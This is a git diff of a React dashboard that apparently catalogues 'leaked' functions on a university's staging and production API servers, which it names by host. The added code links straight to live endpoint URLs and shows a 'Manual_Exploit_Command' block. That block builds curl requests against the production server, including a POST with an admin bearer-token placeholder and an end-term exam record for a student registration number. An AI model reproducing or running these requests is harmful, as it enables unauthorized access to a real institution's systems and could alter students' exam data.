@@ -1,15 +1,20 @@
 "use client";
 
 import { useState, useMemo } from 'react';
-import leakDataRaw from './leak_report.json';
+import dvs1DataRaw from './leak_report.json';
+import coeDataRaw from './coe_audit_pubapi_results.json';
 
 interface LeakItem {
   action: string;
   status: string;
-  response: any;
+  response?: any;
+  error?: string;
+  raw?: string;
+  data?: any;
 }
 
-const leakData = leakDataRaw as LeakItem[];
+const dvs1Data = dvs1DataRaw as LeakItem[];
+const coeData = coeDataRaw as LeakItem[];
 
 const SHREK_ASCII = `⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
 ⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
@@ -60,7 +65,9 @@ export default function Home() {
   const [archiveSearch, setArchiveSearch] = useState('');
   const [showMascots, setShowMascots] = useState(false);
   const [userRegNo, setUserRegNo] = useState('20241BCI0249');
-  
+  const [environment, setEnvironment] = useState<'DVS1' | 'COE'>('DVS1');
+
+  const leakData = environment === 'DVS1' ? dvs1Data : coeData;
 
   const formatLabel = (key: string) => {
     let label = key.startsWith('f') ? key.substring(1) : key;
@@ -154,7 +161,9 @@ export default function Home() {
 
   const getVectorStatus = (item: any) => {
     if (item.status === 'RESTRICTED') return 'RESTRICTED';
+    if (item.status === 'FAILURE') return 'FAILURE';
     if (item.response?.status === 'failure' || item.response?.error_code === -1) return 'FAILURE';
+    if (item.data?.status === 'Failure' || item.data?.status === 'failure' || item.data?.error_code === -1) return 'FAILURE';
     return 'SUCCESS';
   };
 
@@ -167,7 +176,15 @@ export default function Home() {
       const order = { SUCCESS: 1, RESTRICTED: 2, FAILURE: 3 };
       return order[getVectorStatus(a)] - order[getVectorStatus(b)];
     });
-  }, [archiveSearch]);
+  }, [archiveSearch, leakData]);
+
+  const counts = useMemo(() => {
+    return leakData.reduce((acc, item) => {
+      const status = getVectorStatus(item);
+      acc[status] = (acc[status] || 0) + 1;
+      return acc;
+    }, { SUCCESS: 0, RESTRICTED: 0, FAILURE: 0 });
+  }, [leakData]);
 
   const getVectorColors = (status: string, isActive: boolean) => {
     if (isActive) {
@@ -206,20 +223,61 @@ export default function Home() {
         </div>
       </header>
 
+      {/* Environment Toggle */}
+      <div className="w-full max-w-6xl mb-8 flex flex-col items-center animate-in fade-in slide-in-from-bottom-4 duration-500 z-50">
+        <div className="flex bg-white/5 border border-white/10 p-1 rounded-full relative shadow-lg mb-4">
+          <button
+            onClick={() => { setEnvironment('DVS1'); setActiveVector(''); setData(null); setError(null); }}
+            className={`px-8 py-3 rounded-full font-black text-sm uppercase tracking-widest transition-all duration-300 z-10 ${
+              environment === 'DVS1' 
+                ? 'bg-[#00ff00] text-black shadow-[0_0_20px_rgba(0,255,0,0.4)]' 
+                : 'text-white/60 hover:text-white'
+            }`}
+          >
+            [STAGING: DVS1] ({dvs1Data.length})
+          </button>
+          <button
+            onClick={() => { setEnvironment('COE'); setActiveVector(''); setData(null); setError(null); }}
+            className={`px-8 py-3 rounded-full font-black text-sm uppercase tracking-widest transition-all duration-300 z-10 ${
+              environment === 'COE' 
+                ? 'bg-[#ff4d4d] text-black shadow-[0_0_20px_rgba(255,77,77,0.4)]' 
+                : 'text-white/60 hover:text-white'
+            }`}
+          >
+            [PRODUCTION: COE] ({coeData.length})
+          </button>
+        </div>
+
+        {/* Environment Link */}
+        <a 
+          href={environment === 'DVS1' ? 'https://dvs1.pgi-intraconnect.in/tdvs-php/app.php' : 'https://coe.pgi-intraconnect.in/pubapi/app.php'} 
+          target="_blank" 
+          rel="noreferrer"
+          className={`font-mono text-[10px] tracking-widest px-4 py-1.5 rounded-full border flex items-center gap-2 transition-all ${
+            environment === 'DVS1' 
+              ? 'text-[#00ff00]/60 hover:text-[#00ff00] bg-[#00ff00]/5 border-[#00ff00]/20 shadow-[0_0_10px_rgba(0,255,0,0.1)]' 
+              : 'text-[#ff4d4d]/60 hover:text-[#ff4d4d] bg-[#ff4d4d]/5 border-[#ff4d4d]/20 shadow-[0_0_10px_rgba(255,77,77,0.1)]'
+          }`}
+        >
+          <span className={`w-2 h-2 rounded-full animate-pulse ${environment === 'DVS1' ? 'bg-[#00ff00]' : 'bg-[#ff4d4d]'}`}></span>
+          TARGET_ENDPOINT: {environment === 'DVS1' ? 'https://dvs1.pgi-intraconnect.in/tdvs-php/app.php' : 'https://coe.pgi-intraconnect.in/pubapi/app.php'}
+        </a>
+      </div>
+
       {/* Vector Selector - Searchable & Scrollable */}
       <div className="w-full max-w-6xl mb-12 animate-in fade-in slide-in-from-bottom-4 duration-700">
         <div className="flex items-center justify-between mb-4 px-2">
-          <span className="font-mono text-[10px] text-white/70 tracking-widest uppercase">Target Vector Selection</span>
+          <span className="font-mono text-[10px] text-white/70 tracking-widest uppercase">Target Vector Selection (TOTAL FUNCTIONS LEAKED: {leakData.length})</span>
           <div className="flex gap-4">
-            <span className="font-mono text-[10px] text-[#00ff00] tracking-widest">[OPEN]</span>
-            <span className="font-mono text-[10px] text-orange-500 tracking-widest">[RESTRICTED]</span>
-            <span className="font-mono text-[10px] text-[#ff4d4d] tracking-widest">[FAILED]</span>
+            <span className="font-mono text-[10px] text-[#00ff00] tracking-widest">[OPEN: {counts.SUCCESS}]</span>
+            <span className="font-mono text-[10px] text-orange-500 tracking-widest">[RESTRICTED: {counts.RESTRICTED}]</span>
+            <span className="font-mono text-[10px] text-[#ff4d4d] tracking-widest">[FAILED: {counts.FAILURE}]</span>
           </div>
         </div>
         
         <input 
           type="text"
-          placeholder="SEARCH 306 LEAKED FUNCTIONS (e.g., 'scheme', 'bill', 'room')..."
+          placeholder={`SEARCH ${leakData.length} LEAKED FUNCTIONS (e.g., 'scheme', 'bill', 'room')...`}
           className="w-full bg-white/10 border border-white/20 p-4 rounded-xl font-mono text-xs tracking-widest focus:border-[#ff4d4d] focus:outline-none transition-all mb-4"
           value={archiveSearch}
           onChange={(e) => setArchiveSearch(e.target.value)}
@@ -334,9 +392,33 @@ export default function Home() {
                 <h2 className="text-lg font-black uppercase tracking-widest text-[#ff4d4d]">
                   RAW_LEAK_OUTPUT: {activeVector}
                 </h2>
-                <span className="text-[10px] font-mono text-white/60">JSON_DUMP</span>
+                <div className="flex items-center gap-4">
+                  <a 
+                    href={environment === 'DVS1' 
+                      ? `https://dvs1.pgi-intraconnect.in/tdvs-php/app.php?a=${activeVector}&univcode=064` 
+                      : `https://coe.pgi-intraconnect.in/pubapi/app.php?a=${activeVector}&univcode=064`}
+                    target="_blank"
+                    rel="noreferrer"
+                    className="font-mono text-[10px] bg-[#ff4d4d]/10 text-[#ff4d4d] border border-[#ff4d4d]/30 px-3 py-1 rounded hover:bg-[#ff4d4d] hover:text-black transition-colors flex items-center gap-2 tracking-widest"
+                  >
+                    <span className="w-1.5 h-1.5 bg-current rounded-full animate-pulse"></span>
+                    TEST LIVE URL
+                  </a>
+                  <span className="text-[10px] font-mono text-white/60">JSON_DUMP</span>
+                </div>
               </div>
-              <pre className="text-xs font-mono text-[#00ff00] overflow-x-auto whitespace-pre-wrap p-4 bg-white/[0.02] rounded-lg border border-white/5">
+              
+              <div className="flex flex-col mb-4 bg-[#ff4d4d]/5 border border-[#ff4d4d]/20 rounded-lg p-4 mx-4">
+                <span className="text-[10px] text-[#ff4d4d] font-mono mb-2 uppercase tracking-widest font-bold">Manual_Exploit_Command:</span>
+                <code className="text-[10px] text-[#00ff00]/70 font-mono break-all select-all block bg-black p-3 rounded border border-white/5">
+                  {environment === 'COE' 
+                    ? `curl -X POST "https://coe.pgi-intraconnect.in/pubapi/app.php?a=${activeVector}&univcode=064" \\\n  -H "Authorization: Bearer <ADMIN_JWT_TOKEN>" \\\n  -H "Content-Type: application/json" \\\n  -d '[{"regno": "20251BAE0001", "subject": "PSY1001", "school": "SCHOOL OF LIBERAL ARTS AND SCIENCES", "term": "S1", "programLevel": "UG", "batchStartYear": "2025", "assessmentType": "3. End-Term Exam", "assessmentInstance": "End-Term Exam"}]'`
+                    : `curl -X GET "https://dvs1.pgi-intraconnect.in/tdvs-php/app.php?a=${activeVector}&univcode=064&fteachcode=1&fbarcode=1&fmobile=9876543210&fyear=2024"`
+                  }
+                </code>
+              </div>
+
+              <pre className="text-xs font-mono text-[#00ff00] overflow-x-auto whitespace-pre-wrap p-4 mx-4 mb-4 bg-white/[0.02] rounded-lg border border-white/5">
                 {JSON.stringify(data, null, 2)}
               </pre>
             </div>
